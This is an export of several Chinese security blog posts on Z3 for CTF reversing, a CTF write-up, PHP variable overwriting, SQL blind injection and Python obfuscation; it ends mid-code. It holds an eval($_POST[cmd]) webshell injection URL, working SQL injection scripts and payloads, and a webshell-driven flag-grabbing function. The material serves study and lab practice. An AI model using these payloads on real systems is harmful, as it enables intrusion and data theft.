<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Z3简介及在逆向领域的应用]]></title>
    <url>%2F2019%2F04%2F14%2FZ3%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%9C%A8%E9%80%86%E5%90%91%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[本文首发于：安恒讲武堂 前几天在群里看到有人聊到z3，正好在寒假的时候仔细研究过这个模块，今天就和大家分享下z3的简易使用方法和在ctf中该模块对于求解逆向题的帮助 简介z3z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性，通俗的来讲我们可以简单理解为它是一个解方程的计算器 SMTSMT即可满足性模理论，它是对一个实际问题求解的特征描述，这些特征就是我们所求解的特征，SMT会使用一个或多个这样的特征描述式求解，再取每一个特征描述式所对应解的交集。 详细关于SMT的理论可以参考：https://www.cnblogs.com/steven-yang/p/7104068.html 基本数据类型在Python中使用Z3模块，我们的所求结果一般有以下几种数据类型 Int #整型 Bool #布尔型 Array #数组 BitVec(&apos;a&apos;,8) #char型 其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示 基本语句在Python中使用该模块，我们通常用到如下几个语句 Solver() Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解 add() add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式 check() 该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat model() 在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。 模块安装linux下可用如下命令： git clone https://github.com/Z3Prover/z3.git cd z3 python scripts/mk_make.py cd build make make install z3的简单使用求解流程上文提到我们可以将z3理解为一个解方程的计算器，对于求解方程，我们通常会经历四个步骤：设未知数，列方程，解方程，得到正解 使用z3模块，在我的眼中也是同我们解方程一样需要经历四个步骤，下面我们简单来看一下 假设有方程组： 30x+15y=675 12x+5y=265 我们使用z3来解这个方程组： 1.设未知数 In [1]: from z3 import * In [2]: x = Real(&apos;x&apos;) In [3]: y = Real(&apos;y&apos;) 2.列方程 In [4]: s = Solver() In [5]: s.add(30*x+15*y==675) In [6]: s.add(12*x+5*y==265) 3.判断方程解的情况并解方程 In [7]: s.check() Out[7]: sat In [8]: result = s.model() 4.得出正解 In [9]: print result [y = 5, x = 20] 在交互环境中，我们的求解过程如图 最终完整的代码如下： from z3 import * x = Real(&apos;x&apos;) y = Real(&apos;y&apos;) s = Solver() s.add(30*x+15*y==675) s.add(12*x+5*y==265) if s.check() == sat: result = s.model() print result else: print &apos;no result&apos; 可以看到我们很轻松的得到了方程组的解 利用z3解逻辑算数题可能上面解方程组大家觉得这个模块给我们带来的方便并没有那么大，那么通过下面的题目我们或许会对z3有一个全新的认识 在网上翻了很多题目，最终我找到了15年的一道公务员考试题 这个问题的逻辑稍显复杂，我们现在用z3做一下，同样也需要经历上面四个步骤：设，列，解，得 设：2014年小李年龄：a，小李弟弟年龄：b，小王年龄：c，小王哥哥年龄：d 节省篇幅，直接写出求解代码： from z3 import * a = Real(&apos;a&apos;) b = Real(&apos;b&apos;) c = Real(&apos;c&apos;) d = Real(&apos;d&apos;) s = Solver() s.add(b+2==a) s.add(c+2==d) s.add(a+5==d) s.add(b+c-20-20==15) if s.check()==sat: print s.model() else: print &quot;no result&quot; 运行结果： 可以看到我们仅用几行代码就得出了答案，如果用普通的解法，我们要算4个方程所组成的方程组，所以使用z3有时候会大大增加我们的计算效率，简化我们的计算步骤。 z3在逆向题目中的应用本篇以ISCC2018的一道RE题目为例，题目名为：My math is bad 将文件拖入ida中定位到main函数，F5反编译 可以看到有一个if判断，猜测if中的函数为关键函数，进入该函数 在这里看到了rand()函数，这是一个生成伪随机数的函数，所以我们几乎不可能通过逆向的方式，来将flag计算出来，继续阅读代码，发现该随机数种子是固定的，我们可以将种子计算出来，这样就可以进而获得系统生成的随机数，在计算种子的时候，我们可以使用z3模块 为了增加可读性，将关键函数的反汇编代码修饰一下： __int64 v1; // ST40_8 __int64 v2; // ST48_8 __int64 v3; // [rsp+20h] [rbp-60h] __int64 v4; // [rsp+28h] [rbp-58h] __int64 v5; // [rsp+30h] [rbp-50h] __int64 v6; // [rsp+38h] [rbp-48h] __int64 v7; // [rsp+50h] [rbp-30h] __int64 v8; // [rsp+58h] [rbp-28h] __int64 v9; // [rsp+60h] [rbp-20h] __int64 v10; // [rsp+68h] [rbp-18h] __int64 v11; // [rsp+70h] [rbp-10h] __int64 v12; // [rsp+78h] [rbp-8h] if ( strlen(s) != 32 ) return 0LL; v3 = unk_6020B0; v4 = unk_6020B4; v5 = unk_6020B8; v6 = unk_6020BC; if ( a * *s - b * c != 2652042832920173142LL ) goto LABEL_15; if ( 3LL * c + 4LL * b - a - 2LL * *s != 397958918 ) goto LABEL_15; if ( 3 * *s * b - c * a != 3345692380376715070LL ) goto LABEL_15; if ( 27LL * a + *s - 11LL * b - c != 40179413815LL ) goto LABEL_15; srand(c ^ a ^ *s ^ b); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 != 61799700179LL || v6 + v3 + v5 * v8 - v4 * v7 != 48753725643LL || v3 * v9 + v4 * v10 - v5 - v6 != 59322698861LL || v5 * v12 + v3 - v4 - v6 * v11 != 51664230587LL ) { LABEL_15: result = 0LL; } else { result = 1LL; } return result; } 首先我们来计算下a,s,b,c的值： from z3 import * a = Int(&apos;a&apos;) b = Int(&apos;b&apos;) s = Int(&apos;s&apos;) c = Int(&apos;c&apos;) l = Solver() l.add(a*s-b*c==2652042832920173142) l.add(3*c+4*b-a-2*s==397958918) l.add(3 *s * b - c * a == 3345692380376715070) l.add(27 * a + s - 11 * b - c == 40179413815) if l.check()==sat: print l.model() else: print &apos;no result&apos; 然后我们计算出srand(c ^ a ^ *s ^ b);中c^a^s^b的值 c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 result = a^b^c^s print result result的值为103643451 接下来我们继续跟进程序流程，计算rand函数所生成的几个值 使用ida动态调试程序，跳转到srand()函数，因为是直接跳过来的，srand()还没有参数，而刚才我们已将该参数的值通过z3计算了出来，所以在程序运行到mov edi, eax时，直接将eax的值改为103643451即可 然后我们跟进程序，得到了v1的值 继续跟进获得了下面的几个生成值 v1 = 0x16 v2 = 0x27 v7 = 0x2d v8= 0x2d v9 = 0x23 v10= 0x29 v11 = 0xd v12 = 0x24 接着我们到了if的判断 其中v3 v4 v5 v6是未知的，所以在这里我们可以设四个未知数，其他数我们通过前面已经计算出来了，使用z3求解这四个未知数即可 from z3 import * v3 = Int(&apos;v3&apos;) v4 = Int(&apos;v4&apos;) v5 = Int(&apos;v5&apos;) v6 = Int(&apos;v6&apos;) v1 = 0x16 v2 = 0x27 v7 = 0x2d v8= 0x2d v9 = 0x23 v10= 0x29 v11 = 0xd v12 = 0x24 l = Solver() l.add(v6 * v2 + v3 * v1 - v4 - v5 == 61799700179) l.add(v6 + v3 + v5 * v8 - v4 * v7 == 48753725643) l.add(v3 * v9 + v4 * v10 - v5 - v6 == 59322698861) l.add(v5 * v12 + v3 - v4 - v6 * v11 == 51664230587) if l.check() == sat: print l.model() else: print &apos;no result&apos; 运行结果 至此我们需要输入的值都计算出来了 c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 v6 = 1195788129 v4 = 828593230 v3 = 811816014 v5 = 1867395930 这里我们需要将abcs的顺序确定一下，在bss段中可看到其顺序 然后我们需要将这些数字转换为字符串输入，这里用到了libnum库 import libnum c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 v6 = 1195788129 v4 = 828593230 v3 = 811816014 v5 = 1867395930 array = [s,a,c,b,v3,v4,v5,v6] result = &quot;&quot; for i in array: result = result + libnum.n2s(i)[::-1] print result 运行脚本 将字符串输入后我们即可得到flag 总结z3是一个强大的约束求解器，它不仅能处理一些看起来很复杂的逻辑问题，在逆向领域中往往可以简化我们计算步骤，增加求解效率，尤其是在ctf比赛中一些繁杂的RE题目通过z3来解往往显得非常简单，我们在解决问题时如果能灵活应用z3，往往会有意想不到的效果。]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019嘉韦思杯线上赛wp]]></title>
    <url>%2F2019%2F04%2F01%2F2019%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会） 作战计划根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章 https://www.cnblogs.com/leixiao-/p/9786034.html 根据文章中的描述，构造如下payload http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 用蚁剑链接，在服务器根目录下发现flag 土肥原贤二很简单的题目，用sqlmap就可以跑出来 吴佩孚base64解密链接中字符串，得到一串jsfuck，在浏览器执行即可得到flag 日军空袭这应该是一串不全的base64代码，解密过程中报了一次错，然后站点自动补了一段字符串 经过几次解密 得到 fB__l621a4h4g_ai{&amp;i} 栅栏解密即可 飞虎队题目是希尔加密 在网上搜索很久 找到了下面的站点 http://2-dreamfever.lofter.com/post/1d226cf1_748daf4 惊喜的是里面的矩阵和题目中的一样 照着他的思路我们把密文转成数字 a=0,b=1,c=2,d=3… 解密矩阵 8 16 27 8 99 24 27 24 27 矩阵为3*3 所以将密文3个分为一组 去乘解密矩阵然后mod(26) 得到 hillisflagxx 戴星炳上脚本 import re import requests s = requests.Session() url = &apos;http://47.103.43.235:82/web/a/index.php&apos; r = s.get(url) #r.encoding = &apos;utf-8&apos; print(r.text) shi = re.compile(&apos;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&apos;,re.S) num = re.findall(shi, r.text) print(num) #print (&apos;result:\n\n%s=%d\n&apos; % (num, eval(num))) #r = s.post(url, data={&apos;result&apos;: eval(num[0])}) #print (r.text) numstr = &quot;&quot; result = eval(num[0]) print(result) html = s.post(url,data={&apos;result&apos;:result}) print(html.text) 大美晚报扫描二维码，没发现有用的信息 winhex打开，在末尾发现zip数据段，提取出来 根据提示QQ号，暴力破解压缩包密码 打开即可获得flag 池步洲打开题目，查看源码，发现index.phps 下载后 两个字符串不同但是sha1值要相同，这里可以用数组绕过 袁殊基础的RSA，用RSAtools跑一下就出来了 晴气庆胤打开题目查看源码，发现了如下代码 MD5碰撞的题目，网上有现成的整理的payload https://www.cnblogs.com/zaqzzz/p/10029887.html 潘汉年 题目是这样的 然后提示flag格式，说明flag{和密文的前五位是对应的 转换一下密文和flag{的ascii码对应的数值 脚本： a = &quot;bg[`s&quot; b = &quot;flag{&quot; a = list(a) b = list(b) for i in b: print(ord(i)) print(&apos;\n\n&apos;) for e in a: print(ord(e)) 可以看到他们ascii码对应数值的差是递增的4,5,6,7…… 这样题目就清晰了，解密flag脚本如下 a = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot; a = list(a) temp = 4 flag = &quot;&quot; for i in a: print(ord(i)) result = ord(i)+temp temp = temp+1 flag = flag + chr(result) print(flag) 总结可能是是第一届的原因吧，主办方或许有的地方经验还不太够，但是也能看出主办方是花了一些心思的，尤其是UI好评，也希望他们越办越好。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈变量覆盖漏洞]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%B5%85%E8%B0%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[本文首发于：安恒网络空间安全讲武堂 最近在跟师傅们讨论代码审计技巧的时候，好几个师傅都提到了变量覆盖漏洞，对于这一块的知识我并不是了解很多，网上的说明或多或少的都有一些粗略和不足，所以在这几天闲暇之余，我特意地将PHP变量覆盖漏洞进行了系统的总结，在此记录一下，个人难免会有疏漏和不足之处，非常欢迎各位师傅的补充与纠正 简介我认为一个比较正确的定义是：在PHP代码中将自定义参数值替换为原有参数值的情况称为变量覆盖。 变量覆盖漏洞一般单体作用很小，并不能造成很大危害，但是在与其他应用代码或漏洞结合后，其造成的危害可能是无法估量的，最简单的例如购买商品的支付系统，某些爆出的0元支付下单的BUG就常常可以见到变量覆盖漏洞的身影。 常见的漏洞引发类型由$$变量赋值引发的覆盖$$是一种可变变量的写法，它可以使一个普通变量的值作为可变变量的名字，这种类型常常会使用遍历的方式来释放变量的代码，最常见的就是foreach的遍历，示例代码如下： &lt;?php $yml = 10; echo $yml; echo &quot;&lt;br&gt;&quot;; foreach ($_POST as $k =&gt; $v){ $$k = $v; echo $yml; } ?&gt; 无任何操作时的正常输出： 当post内容为yml=1000时： 很明显看到这里$yml的值变为了1000，我们成功的完成了一次变量覆盖。 再拿出一个我前几天给学弟们出的一个小题为例子： 代码： &lt;?php include(&apos;flag.php&apos;); $flag = &apos;flag{it_Is_Y0ur_flag}&apos;; foreach ($_POST as $key =&gt; $value) { $a = $value; $$$key=$value; $ccut = $flag; $yml = $_GET[&quot;flag&quot;]; if ($yml == &quot;iwantflag&quot;) { if ($ccut == &quot;flag&quot;) { echo $fl4g; } else { echo &quot;you will get it&quot;; } } else { echo &quot;nonono&quot;; } # code... } highlight_file(__FILE__); ?&gt; 题目的本质还是变量覆盖，题目中核心的部分就是需要将$flag的值由flag{it_Is_Y0ur_flag}覆盖为flag,仔细阅读代码流程再结合上面的例子就可以轻松解出，我这里直接给出payload： extract()函数使用不当导致的变量覆盖该函数可以将变量从数组中导入当前的符号表 我们看一下在w3school中函数的定义 这里我们要注意一下该函数的第二个参数，该参数的选择就确定了将变量导入符号表时的行为，在实际生产生活中，我们常常使用的值有EXTR_OVERWRITE和EXTR_SKIP。 当值设定为EXTR_SKIP时，在导入符号表的过程中，如果变量名发生冲突，则跳过该变量不进行覆盖，当值为EXTR_OVERWRITE时如果发生冲突，则覆盖已有变量，该函数在不指定第二个参数时默认使用EXTR_OVERWRITE，这就为我们提供了覆盖的可能。 示例代码： &lt;?php $yml = 10; echo &apos;out0:&apos;.$yml; extract($_POST); echo &apos;&lt;br&gt;&apos;; echo &quot;out1:&quot;.$yml; ?&gt; 无post输入时 输入yml=199时： 我们成功的将$yml的值从10覆盖为了199 全局变量的覆盖如果某些变量没有被初始化，并且黑客可以控制，将会是一件很危险的事情，在这种情况下，漏洞触发的前提是register_globals为ON(register_globals的值可以在php.ini中修改，我在个人的PHPstudy上发现在php5.2版本后该值默认是OFF) 示例代码： &lt;?php echo (int)ini_get(&quot;register_globals&quot;); echo &apos;&lt;br&gt;&apos;; echo &quot;yml=&quot;.$yml; ?&gt; 当register_globals为OFF时 可以我们无法将未初始化的变量进行注册，但是当register_globals的值为ON时，结果如下 可以看到我们成功注册了一个未初始化的变量 还有一种通过$GLOBALS获取的变量在使用不当时也会导致变量覆盖，同样漏洞触发的前提是register_globals为ON 还是用上面的示例代码： 我们成功通过注入GLOBALS[yml]来改变$yml的值 parse_str()函数使用不当导致的覆盖该函数可以把查询的字符串解析到变量中，我们来看一下w3school中对该函数的定义 这里指的注意的是，如果未设置第二个参数的值，由该函数设置的变量将覆盖已存在的同名变量 所以当我们没有设置函数的第二个参数时，恶意攻击者很可能通过特定的输入来改变代码中已定义的变量的值 示例： &lt;?php $yml = &quot;cool&quot;; echo &quot;out0:&quot;.$yml; echo &quot;&lt;br&gt;&quot;; $a = $_GET[&apos;a&apos;]; parse_str($a); echo &quot;out1:&quot;.$yml; ?&gt; 在这里我们没有设置parse_str()函数的第二个参数，现在我们来尝试构造同名变量 可以看到我们成功的使用构造同名变量的方法覆盖掉了$yml的原有值 import_request_variables所导致的变量覆盖该函数可以将 GET／POST／Cookie 变量导入到全局作用域中，我们看一下该函数的定义(在PHP5.4之后的版本中，该函数将不再使用) 该函数的第二个参数用于设置注册变量的前缀，漏洞触发的原因是当第二个参数未进行设置时，将会出现覆盖全局变量的情况 示例： &lt;?php $yml = &quot;happy&quot;; echo &quot;out0:&quot;.$yml; echo &quot;&lt;br&gt;&quot;; import_request_variables(&apos;P&apos;); echo &quot;out1:&quot;.$yml; ?&gt; 无输入时： 代码没有设置import_request_variables的第二个参数，我们来设置同名变量输入看是否能够进行覆盖 在这里我们成功的注册了同名的全局变量将原有变量的值进行了覆盖。 漏洞防御对于第一种情况，在审计的时候要注意$$的赋值语句，使用恰当的方式防止变量覆盖漏洞的发生 对于第二种情况，在使用extract()函数时，可以指定将第二个参数设置为EXTRSKIP，并且留意变量的获取顺序，控制好用户的输入。 对于第三种情况，强烈推荐将registerglobals设置为Off 对于第四种情况，我们应该在使用parse_str()时养成指定第二个参数的习惯，这样才能避免变量被覆盖 对于最后一种情况，我们同样要指定第二个函数参数来设置要注册的变量前缀，不过这个函数现在已经很少用了。 总结变量覆盖漏洞触发的灵活性较高，但我们只要抓住根本问题，控制好用户输入并且规范代码的书写，还是可以进行防范的，该漏洞经常在ctf题目中作为一个考点出现，只要我们紧跟代码逻辑，还是很容易解出题目的。]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql盲注的学习]]></title>
    <url>%2F2019%2F03%2F23%2Fsql%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[本文首发于：安恒网络空间安全讲武堂 这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。 函数整理这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正 left(m,n) #从左向右截取字符串m返回其前n位 substr(m,1,2) #取字符串m的左边第一位起，2字长的字符串 ascii(m) #返回字符m的ASCII码 if(str1,str2,str3) #如果str1正确就执行str2，否则执行str3 sleep(m) #使程序暂停m秒 length(m) #返回字符串m的长度 count(column_name) #返回指定列的值的数目 concat()函数和group_concat()区别concat() 该函数用于联合两条数据结果，通常是联合两个字段名，如concat(username,0x23,passwd),数据将由#分割开 group_concat() 这个函数与concat()用法是类似的，但如果管理员账号不止一个的话，concat一次只能注出一组用户名密码，而使用group_concat()可以实现一次注出多组数据。 盲注类型基于布尔的盲注特征 被注入的页面没有sql语句执行错误的显示，页面只有正常返回和不正常返回两种状态 示例 这里我拿sqli-labs的less8作为布尔型盲注的例子 我们可以看到这个页面正常会返回You are in………..而不正常的时候会无任何返回，这就很符合布尔盲注的特征 正常返回： 非正常返回： 构造?id=1’ and 1=1 %23时正常返回 这里基本就可以确定可以使用布尔盲注来获得数据库中的数据 接下来我们来猜解库名，在猜解库名之前，我们首先需要知道库名的长度 这里我们就可以利用length()函数来进行长度的爆破： http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (length(database())=m) %23 //m=1,2,3,4..... 代码如下： 结果 接下来开始进行库名的猜解，这里用到了ascii()函数和substr()函数，具体的语句如下： http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),m,1))=n %23 //其中m 和 n是可变的参数 猜解库名的自动化脚本函数如下： 结果如下： 猜解表名和字段和猜解库名是一样的，篇幅原因将代码直接放出： import requests def get_dblength(base_url): url = base_url+&quot;&apos; and (length(database())={0}) %23&quot; base_num = 100 for i in range(0,base_num): url1 = url.format(i) print(url1) result = len(requests.get(url1).text) if result == base_result: print(&quot;库名长度:&quot;,i) break return i def get_dbname(base_url,db_length): dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos; dbname = &quot;&quot; url = base_url+&quot;&apos; and ascii(substr(database(),{0},1))={1} %23&quot; for i in range(1,db_length+1): for m in dict: m_ascii = ord(m) url2 = url.format(i,m_ascii) result = requests.get(url2) if len(result.text) == base_result: dbname += m print(dbname) break print(&quot;库名:&quot;,dbname) def get_table_length(): url = base_url + &quot;&apos; and (select length(table_name) from information_schema.tables where table_schema = database() limit {0},1)={1}%23&quot; for i in range(0,20): url1 = url.format(2,i) result = requests.get(url1) if base_result == len(result.text): print(&quot;表名长度:&quot;,i) break return i def get_table_name(table_length): dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos; table_name = &quot;&quot; url = base_url + &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {0},1),{1},1))={2} %23&quot; for i in range(1,table_length + 1): for m in dict: ascii_m = ord(m) url1 = url.format(2,i,ascii_m) result = requests.get(url1).text if base_result == len(result): table_name +=m print(&quot;表名:&quot;,table_name) break return table_name if __name__ == &apos;__main__&apos;: base_url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; base_result = len(requests.get(base_url).text) dblength = get_dblength(base_url) get_dbname(base_url, dblength) get_table_length() get_table_name(7) 基于时间的盲注特征 被注入页面无论作何输入都回显相同的数据，导致我们无法判断注入是否成功，这时我们就可以使用以sleep()函数为核心的注入语句进行延时注入 示例 以sqli-labs less9作为示例 不管我们输入什么页面都显示You are in………..这时我们就可以用延时注入的方法进行数据库数据的获取 同样我们需要先获取库名的长度，然后再获取库名 这里主要使用到了sleep(),substr()和length()函数 获取库名长度： http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((length((select database()))=m),sleep(5),NULL) %23//其中m为整型可变参数，如果猜解正确，页面将会暂停响应5秒 获取库名： http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((substr((select database()),m,1)=&apos;n&apos;),sleep(5),NULL) %23//其中m为整形,n为char型可变参数 爆破代码： import requests def db_post(url): try: result = requests.get(url,timeout=4) return 0 except: return 1 def get_db_length(): url = base_url + &quot;&apos; and if((length((select database()))={0}),sleep(5),NULL) %23&quot; for i in range(0,20): url1 = url.format(i) temp = db_post(url1) if temp == 1: print(&quot;数据库名长度:&quot;,i) break return i def get_db_name(db_length): db_name = &quot;&quot; url = base_url + &quot;&apos; and if((substr((select database()),{0},1)=&apos;{1}&apos;),sleep(5),NULL) %23&quot; print(&quot;开始猜解库名&quot;) for i in range(1,db_length+1): for m in dict: url1 = url.format(i,m) temp = db_post(url1) if temp == 1: db_name += m print(db_name) break print(&quot;库名：&quot;,db_name) return db_name if __name__ == &apos;__main__&apos;: dict = &apos;abcdefghijklmnopqrstuvwxyz&apos; base_url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; db_length = get_db_length() get_db_name(db_length) 可以看到成功将库名猜解出来 剩下的表名和字段将脚本稍作修改即可猜解出来，篇幅原因不再重复操作 基于报错的盲注(floor报错注入)原理 该类型的注入利用了mysql的8652号BUG(官方链接:https://bugs.mysql.com/bug.php?id=8652)，当使用group by对某些rand函数操作时，会返回带有敏感信息的错误信息，我们可以通过特定的sql语句组合来控制返回敏感信息的内容，从而实现间接的注入 示例 对于BUG触发的原理本篇不做分析，通过对该类型注入的资料收集，根据网络上的payload我整理了一份有效的注入语句 以sqli-labs less5为实际示例 这里要用到concat和count函数 回显库名： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select database()),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 接下来是表名的注入，我们同样需要知道表名的个数： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 表名有四个，接着注出表名： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 想注出全部表名修改limit参数即可 列名和数据同理修改查询语句就可以了。 总结盲注是一个比较费神和考验逻辑的注入方式，在注入的过程中会做很多相同的工作，为了节省时间和精力，建议大家在平时练习的时候多编写自动脚本，这样能节省很多时间，避免做更多重复无用的工作]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈几种Python源代码加密技术]]></title>
    <url>%2F2019%2F03%2F10%2F%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DPython%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[文章首发于 安恒网络空间安全讲武堂 ：https://mp.weixin.qq.com/s/N8liasMhiiTHC_1KC3JQJQ 随着Python近年的流行，很多开发者选择用Python作为自己首选的开发语言，其简洁的语法和轻量的运行方式受到越来越多开发者的喜爱，但是对于一些个人开发者而言，某些不想开源的程序使用Python开发后很难保证其源代码不被他人剽窃，今天作者就和大家说说几种流行的Python代码加密方式，分析各种利弊并给大家推荐一下最佳的Python代码加密方案，今天主要的对象是基于Python3.X开发的应用程序(实测这些方法在2.x版本中也是可以使用的) 生成pyc文件发布简介pyc文件是一种经py文件编译后的二进制文件，他可以跨平台在Python虚拟机中运行，pyc文件打开是无法看到我们正常的源码的，例如这样： 源代码： 编译成的pyc文件： 可以看到辨识度基本为0 方法一般一个项目的代码会有多个Python文件，我们需要批量生成pyc文件，这里可以使用compileall模块，我这里的示例项目是在E盘下code文件夹中，生成代码为： import compileall compileall.compile_dir(r&apos;E:/code&apos;) 执行完后会发现项目下多了一个 pycache 文件夹，打开后就是编译后的pyc文件 代码函数变量混淆这种加密方式类似于PHP的变量混淆加密，通过奇特的变量命名方式使代码难以被读取和理解，这种混淆非常恶心，有时源代码就在你眼前，你却无法知道该段代码的含义，令人很头疼 经过一番探索，我找到了一个在线进行混淆的站点，下个月计划自己写一个混淆代码的程序，届时也会第一时间开源分享给大家 神奇的站点：http://pyob.oxyry.com/ 拿我写的一个函数作为例子(特意找了一个长的，方便大家更直观看到差别) 源代码： def get_flag(get_flag_cmd): list = [] global flag print(&quot;DEMO:http://10.10.10.10/index.php?flag= yml-flag &amp;name=666&quot;) submit_flag_url = input(&quot;请输入提交flag的链接(flag用yml-flag替换,两边加空格):&quot;) with open(&quot;data/flagshell.txt&quot;, &apos;r&apos;) as f: line = f.readline().strip() while line: list.append(line) line = f.readline().strip() i = 0 url = {} passwd = {} method = {} for data in list: if data: ls = data.split(&quot;,&quot;) method_tmp = str(ls[2]) method_tmp = method_tmp.lower() #print(method_tmp) if method_tmp == &apos;post&apos; or method_tmp == &apos;get&apos;: url[i] = str(ls[0]) method[i] = method_tmp passwd[i] = str(ls[1]) #print(url[i]) #print(method[i]) #print(passwd[i]) i += 1 else: print(&quot;[-] %s request method error!&quot; % (str(ls[0]))) else: pass time_temp = 1 while True: for j in range(len(url)): return_flag = socket_flag(url=url[j], method=method[j], passwd=passwd[j], get_flag_cmd=get_flag_cmd) flag.append(return_flag) save_flag() print(&quot;3秒后尝试提交flag:&quot;) for i in range(1, 4): s = &apos;&gt;&apos; * i + &apos;[&apos; + str(i) + &apos;s&apos; + &apos;]&apos; # 这个方法同第二种类似 print(&apos;%s&apos; % s, end=&apos;\r&apos;) # 每行以&apos;\r&apos;结尾，就可以输出在同一行 time.sleep(1) for submit_flag_str in flag: submit_flag(url=submit_flag_url, flag=submit_flag_str) print(&quot;60秒进行下一轮操作:&quot;) for i in range(1, 61): s = &apos;&gt;&apos; * i + &apos;[&apos; + str(i) + &apos;s&apos; + &apos;]&apos; # 这个方法同第二种类似 print(&apos;%s&apos; % s, end=&apos;\r&apos;) time.sleep(1) flag = [] time_temp = time_temp + 1 print(time_temp) 混淆后的代码： def get_flag (OOOO0000O0OOOOOO0 ):#line:1 O00000OOO0OO00OOO =[]#line:2 global flag #line:3 print (&quot;DEMO:http://10.10.10.10/index.php?flag= yml-flag &amp;name=666&quot;)#line:4 OO0OOOO0OOOO00OO0 =input (&quot;请输入提交flag的链接(flag用yml-flag替换,两边加空格):&quot;)#line:5 with open (&quot;data/flagshell.txt&quot;,&apos;r&apos;)as OOO0000OO0O0O00O0 :#line:6 OOOO0OO0O000O0OO0 =OOO0000OO0O0O00O0 .readline ().strip ()#line:7 while OOOO0OO0O000O0OO0 :#line:8 O00000OOO0OO00OOO .append (OOOO0OO0O000O0OO0 )#line:9 OOOO0OO0O000O0OO0 =OOO0000OO0O0O00O0 .readline ().strip ()#line:10 O00OOOO0000OO00O0 =0 #line:11 OO00OO00000OOOOOO ={}#line:12 OO0OO000O0O0OO0O0 ={}#line:13 OOOOO0OO0O00OOOOO ={}#line:14 for OO00OOOO0000OOO0O in O00000OOO0OO00OOO :#line:15 if OO00OOOO0000OOO0O :#line:16 O00O0O00O000000O0 =OO00OOOO0000OOO0O .split (&quot;,&quot;)#line:17 OO000OO00OO00OO0O =str (O00O0O00O000000O0 [2 ])#line:18 OO000OO00OO00OO0O =OO000OO00OO00OO0O .lower ()#line:19 if OO000OO00OO00OO0O ==&apos;post&apos;or OO000OO00OO00OO0O ==&apos;get&apos;:#line:21 OO00OO00000OOOOOO [O00OOOO0000OO00O0 ]=str (O00O0O00O000000O0 [0 ])#line:22 OOOOO0OO0O00OOOOO [O00OOOO0000OO00O0 ]=OO000OO00OO00OO0O #line:23 OO0OO000O0O0OO0O0 [O00OOOO0000OO00O0 ]=str (O00O0O00O000000O0 [1 ])#line:24 